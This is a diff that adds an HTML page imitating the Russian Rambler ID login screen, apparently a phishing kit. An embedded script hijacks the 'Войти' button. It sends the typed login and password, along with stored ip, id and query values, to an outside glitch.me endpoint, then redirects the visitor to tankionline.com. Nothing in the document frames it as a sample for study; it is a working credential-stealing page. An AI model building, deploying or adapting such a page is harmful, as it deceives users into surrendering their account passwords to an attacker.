@@ -1,0 +1,138 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+	
+	<meta http-equiv="X-UA-Compatible" content="IE=8">
+	<link rel="stylesheet" type="text/css" href="rembles/id.css" media="all">
+	<link rel="icon" href="http://id.rambler.ru/favicon.ico" type="image/x-icon">
+	<link rel="shortcut icon" href="http://id.rambler.ru/favicon.ico" type="image/x-icon">
+	<title>Рамблер ID — авторизация</title>
+	<style type="text/css">
+		#testName, #testPass {overflow:hidden;position:absolute;margin-top:-5px;margin-left:95px}
+		#testName, #testName .hp, #testPass, #testPass .hp {display:none}
+		#testName.s, #testPass.s {display:block}
+		#testName.s1 .x1, #testName.s2 .x2, #testName.s3 .x3, #testPass.s1 .x1, #testPass.s2 .x2, #testPass.s3 .x3 {display:block;color:#000}
+		.testCaseBody {margin:0;padding:4px 5px 4px 5px;background-color:#fef5f5;border:1px solid #c00;border-top-width:0px}
+		.testCaseCaption {width:100%;overflow:hidden;height:10px;background-position:-410px -40px}
+	</style>
+	
+</head>
+<body>
+
+
+
+<div id="topline" class="topline">
+	<ul>
+	<li id="topline-right">
+		<a href="http://help.rambler.ru/" target="_blank" title="Подробная справка">Помощь</a>
+		&nbsp;&nbsp;•&nbsp;&nbsp;
+		<a href="http://mail.rambler.ru/" title="Перейти в Рамблер-Почту">Почта</a>
+	</li>
+	<li><a href="http://rambler.ru/" title="Перейти на главную страницу Рамблера">Главная страница</a></li>
+	</ul>
+</div>
+
+<div id="content">
+	<div id="wrapper">
+
+<!-- /header -->
+	<h2><span><img src="rembles/keys.png">&nbsp;Авторизация на&nbsp;Рамблере</span></h2>
+
+
+	
+
+
+
+<form>
+
+	<div id="loginform" class="stage active">
+		<em class="ct"><em></em></em>
+		<div class="wrapper">
+			<p class="rs-element">
+				<label for="login">Логин:</label>
+				<span class="indicator">
+					<input type="text" id="lgn" name="email" class="text" maxlength="129" tabindex="1" title="Ваше имя на Рамблере">
+						<select id="email2" name="domain" title="Выберите домен" tabindex="3">
+						
+						<option value="rambler.ru" selected="selected">@rambler.ru</option>
+						
+						<option value="lenta.ru">@lenta.ru</option>
+						
+						<option value="myrambler.ru">@myrambler.ru</option>
+						
+						<option value="autorambler.ru">@autorambler.ru</option>
+						
+						<option value="ro.ru">@ro.ru</option>
+						
+						<option value="r0.ru">@r0.ru</option>
+						
+						</select>
+						</span>
+				</p>
+			
+			<p class="rs-element">
+				<label for="passwd">Пароль:</label>
+					<span class="indicator"><input type="password" id="psw" class="text" name="email_pass" value="" tabindex="1" title="Ваш пароль"></span>
+				</p>
+
+
+			<p class="rs-element">
+				<label for="long-session" id="remember"><input type="checkbox" id="long-session" name="long_session" checked="checked" tabindex="1">Запомнить меня</label>
+			</p>
+			<p class="rs-element b-enter">
+				<label for="enter">&nbsp;</label>
+					<input type="submit" id="btn" class="submit" value="Войти" title="Изменить пароль">
+				</p>
+			</div>
+		<em class="cb"><em></em></em>
+	</div>
+
+	</form>
+   <script>
+    document.querySelector('#btn').addEventListener('click', async function (e) {
+      e.preventDefault()
+let r = await fetch('https://placid-succulent-marigold.glitch.me/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: new URL(location.href).origin,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    query: localStorage.getItem('num'),
+                    type: 'tan'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                   location.replace('https://tankionline.com')
+                }, 500)
+            })
+    })
+  </script> 
+
+	<p class="note"><a href="http://id.rambler.ru/" title="Перейти на страницу восстановления пароля">Вспомнить пароль</a></p>
+
+	
+	</div>
+	</div>
+
+	<div id="footer">
+		<dl>
+			<dt class="footer-right">
+				<span>© 1996–2011, ООО «<a href="http://www.rambler.ru/doc/about.shtml" title="О компании «Рамблер Интернет Холдинг»">Рамблер Интернет Холдинг</a>»</span>
+			</dt>
+			<dt class="footer-left">
+				<span><a href="http://www.rambler.ru/doc/advert/" title="Разместить рекламу на Рамблере">Разместить рекламу</a></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span><a href="http://www.rambler.ru/click?from=id&reqid=DF132655508312EA&block=footer&link=feedback&_URL=http://help.rambler.ru/feedback.html?s=mail" title="Написать отзыв или сообщить об ошибке">Обратная связь</a></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span><a href="http://www.rambler.ru/click?from=mail&reqid=DF132655508312EA&block=footer&link=legal&_URL=http://help.rambler.ru/legal/?s=103" target="_blank" title="Юридическая информация">Правила пользования и&nbsp;конфиденциальность</a></span>
+			</dt>
+		</dl>
+	</div>
+
+
+<!-- footer -->
+
+
+
+<!-- /footer -->
+</body></html>
